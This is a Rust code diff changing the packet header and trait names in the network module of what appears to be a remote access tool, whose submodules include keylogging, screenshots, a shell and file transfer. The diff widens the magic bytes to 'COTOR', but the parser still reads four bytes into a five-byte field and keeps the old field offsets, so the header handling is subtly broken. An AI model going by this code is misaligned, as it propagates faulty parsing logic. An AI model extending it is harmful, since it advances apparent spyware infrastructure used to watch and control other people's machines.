@@ -1,11 +1,11 @@
-pub mod aes;
 pub mod filetransfer;
 pub mod keylog;
-pub mod listdir;
-pub mod message;
-pub mod rsa;
+pub mod cotor;
 pub mod screenshot;
 pub mod shell;
+pub mod types;
+pub mod system;
+pub mod encryption;
 
 use crate::network::crypt;
 use crate::network::crypt::KeyChain;
@@ -28,16 +28,20 @@ pub enum PacketEncryption {
 #[derive(Debug, Copy, Clone)]
 pub struct PacketHeader {
     pub size: u32,
-    pub magic: [u8; 4],
+    pub magic: [u8; 5],
     pub version: u8,
     pub encryption: PacketEncryption,
 }
+
+const PACKET_MAGIC: [u8; 5] = [0x43, 0x4F, 0x54, 0x4F, 0x52]; // "COTOR"
+static PACKET_HEADER_SIZE: usize = 4 + PACKET_MAGIC.len() + 1 + 1;
+
 
 impl PacketHeader {
     pub fn new(size: u32, encryption: PacketEncryption) -> Self {
         Self {
             size,
-            magic: [0x43, 0x4F, 0x54, 0x52], // "COTR"
+            magic: PACKET_MAGIC,
             version: 1,
             encryption,
         }
@@ -56,6 +60,9 @@ impl PacketHeader {
         }
         let size = u32::from_le_bytes(data[0..4].try_into().unwrap());
         let magic = data[4..8].try_into().unwrap();
+        if magic != PACKET_MAGIC {
+            return Err("Invalid magic number in PacketHeader".to_string());
+        }
         let version = data[8];
         let encryption = match data[9] {
             0 => PacketEncryption::Plain,
@@ -71,9 +78,6 @@ impl PacketHeader {
         })
     }
 }
-
-static PACKET_HEADER_SIZE: usize = 10;
-
 #[derive(Debug, Clone)]
 pub struct NetworkPacket {
     pub header: PacketHeader,
@@ -203,9 +207,9 @@ impl NetworkPacket {
         }
     }
 
-    pub fn decrypt(&self, key_chain: &KeyChain) -> Result<Box<dyn AnyPacketData>, String> {
+    pub fn decrypt(&self, key_chain: &KeyChain) -> Result<Box<dyn AnyPacket>, String> {
         let data = &self.data;
-        let packet: Box<dyn AnyPacketData> = match self.header.encryption {
+        let packet: Box<dyn AnyPacket> = match self.header.encryption {
             PacketEncryption::Plain => rmp_serde::from_slice(data)
                 .map_err(|err| format!("Failed to decode plain packet data: {}", err))?,
             PacketEncryption::AES => match key_chain.aes_key {
@@ -238,20 +242,20 @@ impl NetworkPacket {
 }
 
 #[typetag::serde(tag = "type")]
-pub trait AnyPacketData: Any + Send + Sync + Debug {
+pub trait AnyPacket: Any + Send + Sync + Debug {
     fn as_any(&self) -> &dyn Any;
     fn as_any_box(self: Box<Self>) -> Box<dyn Any + Send + Sync>;
 }
 
-pub trait EncodablePacket: AnyPacketData + Serialize + DeserializeOwned + Send + Sync {
+pub trait EncodablePacket: AnyPacket + Serialize + DeserializeOwned + Send + Sync {
     fn bin_serialize(&self) -> Result<Vec<u8>, String>;
     fn plain_encode(&self) -> Result<NetworkPacket, String>;
     fn aes_encode(&self, aeskey: &crypt::aes::AESKey) -> Result<NetworkPacket, &'static str>;
     fn rsa_encode(&self, rsakey: &crypt::rsa::RSAPublicKey) -> Result<NetworkPacket, String>;
 }
-impl<T: AnyPacketData + Serialize + DeserializeOwned + Send + Sync> EncodablePacket for T {
+impl<T: AnyPacket + Serialize + DeserializeOwned + Send + Sync> EncodablePacket for T {
     fn bin_serialize(&self) -> Result<Vec<u8>, String> {
-        let data: &dyn AnyPacketData = self;
+        let data: &dyn AnyPacket = self;
         rmp_serde::to_vec(data).map_err(|_| "Failed to serialize packet data".to_string())
     }
 
